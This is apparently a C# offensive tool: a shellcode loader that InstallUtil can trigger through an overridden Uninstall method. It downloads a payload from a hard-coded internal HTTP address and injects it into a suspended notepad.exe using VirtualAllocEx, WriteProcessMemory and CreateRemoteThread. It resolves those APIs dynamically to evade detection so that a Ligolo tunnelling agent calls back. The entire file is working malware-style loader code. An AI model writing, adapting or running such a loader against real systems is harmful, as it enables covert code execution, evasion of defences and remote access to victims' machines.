using System;
using System.Collections;
using System.ComponentModel;
using System.Configuration.Install;
using System.Diagnostics;
using System.Net;
using System.Runtime.InteropServices;

public static class Config
{
    public const string DefaultURL = "http://192.168.45.177/ligolo/agent.bin";
}

[System.ComponentModel.RunInstaller(true)]
public class LigoloInstaller : Installer
{
    public override void Uninstall(IDictionary savedState)
    {
        base.Uninstall(savedState);
        string url = Context.Parameters["URL"] ?? Config.DefaultURL;
        Console.WriteLine("[*] InstallUtil triggered. URL: {0}", url);
        ShellcodeRunner.Run(url);
    }
}

public class ShellcodeRunner
{
    public static void Run(string url)
    {
        // 1. 下载 shellcode
        Console.WriteLine("[*] Downloading shellcode from: {0}", url);
        byte[] buf;
        try
        {
            using (WebClient wc = new WebClient())
            {
                buf = wc.DownloadData(url);
            }
            Console.WriteLine("[+] Downloaded {0} bytes", buf.Length);
        }
        catch (Exception ex)
        {
            Console.WriteLine("[-] Download failed: {0}", ex.Message);
            return;
        }

        // 2. 创建挂起的 notepad.exe
        Console.WriteLine("[*] Creating suspended notepad.exe...");
        STARTUPINFO si = new STARTUPINFO();
        si.cb = Marshal.SizeOf(si);
        PROCESS_INFORMATION pi;
        string notepadPath = Environment.GetEnvironmentVariable("WINDIR") + @"\System32\notepad.exe";
        if (!CreateProcess(notepadPath, null, IntPtr.Zero, IntPtr.Zero, false,
            0x00000004, IntPtr.Zero, null, ref si, out pi)) // CREATE_SUSPENDED
        {
            Console.WriteLine("[-] CreateProcess failed, error: {0}", Marshal.GetLastWin32Error());
            return;
        }
        Console.WriteLine("[+] notepad.exe started (PID={0})", pi.dwProcessId);

        // 3. 在 notepad 中分配内存
        IntPtr hKernel32 = LoadLibraryA("kernel32.dll");
        IntPtr pVirtualAllocEx = GetProcAddress(hKernel32, "VirtualAllocEx");
        IntPtr pWriteProcessMemory = GetProcAddress(hKernel32, "WriteProcessMemory");
        IntPtr pCreateRemoteThread = GetProcAddress(hKernel32, "CreateRemoteThread");

        var VirtualAllocEx = (VirtualAllocExDelegate)Marshal.GetDelegateForFunctionPointer(pVirtualAllocEx, typeof(VirtualAllocExDelegate));
        var WriteProcessMemory = (WriteProcessMemoryDelegate)Marshal.GetDelegateForFunctionPointer(pWriteProcessMemory, typeof(WriteProcessMemoryDelegate));
        var CreateRemoteThread = (CreateRemoteThreadDelegate)Marshal.GetDelegateForFunctionPointer(pCreateRemoteThread, typeof(CreateRemoteThreadDelegate));

        IntPtr remoteAddr = VirtualAllocEx(pi.hProcess, IntPtr.Zero, (uint)buf.Length, 0x3000, 0x40); // MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
        if (remoteAddr == IntPtr.Zero)
        {
            Console.WriteLine("[-] VirtualAllocEx failed, error: {0}", Marshal.GetLastWin32Error());
            return;
        }
        Console.WriteLine("[+] Remote memory allocated at 0x{0:X}", (long)remoteAddr);

        // 4. 写入 shellcode
        uint written = 0;
        if (!WriteProcessMemory(pi.hProcess, remoteAddr, buf, (uint)buf.Length, out written) || written != buf.Length)
        {
            Console.WriteLine("[-] WriteProcessMemory failed");
            return;
        }
        Console.WriteLine("[+] Shellcode written ({0} bytes)", written);

        // 5. 创建远程线程执行
        IntPtr hThread = CreateRemoteThread(pi.hProcess, IntPtr.Zero, 0, remoteAddr, IntPtr.Zero, 0, IntPtr.Zero);
        if (hThread == IntPtr.Zero)
        {
            Console.WriteLine("[-] CreateRemoteThread failed, error: {0}", Marshal.GetLastWin32Error());
            return;
        }
        Console.WriteLine("[+] Remote thread created, Ligolo agent should connect back now.");

        // 清理句柄
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        CloseHandle(hThread);
    }

    #region Win32 API
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr LoadLibraryA(string name);
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr GetProcAddress(IntPtr h, string name);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool CreateProcess(string lpApplicationName, string lpCommandLine,
        IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles,
        uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory,
        ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool CloseHandle(IntPtr hObject);

    delegate IntPtr VirtualAllocExDelegate(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    delegate bool WriteProcessMemoryDelegate(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);
    delegate IntPtr CreateRemoteThreadDelegate(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [StructLayout(LayoutKind.Sequential)]
    struct STARTUPINFO
    {
        public int cb;
        public string lpReserved, lpDesktop, lpTitle;
        public int dwX, dwY, dwXSize, dwYSize, dwXCountChars, dwYCountChars, dwFillAttribute, dwFlags;
        public short wShowWindow, cbReserved2;
        public IntPtr lpReserved2, hStdInput, hStdOutput, hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct PROCESS_INFORMATION
    {
        public IntPtr hProcess, hThread;
        public int dwProcessId, dwThreadId;
    }
    #endregion
}

class Program
{
    static void Main(string[] args)
    {
        string url = args.Length > 0 ? args[0] : Config.DefaultURL;
        Console.WriteLine("[*] Entry point Main. URL: {0}", url);
        ShellcodeRunner.Run(url);
    }
}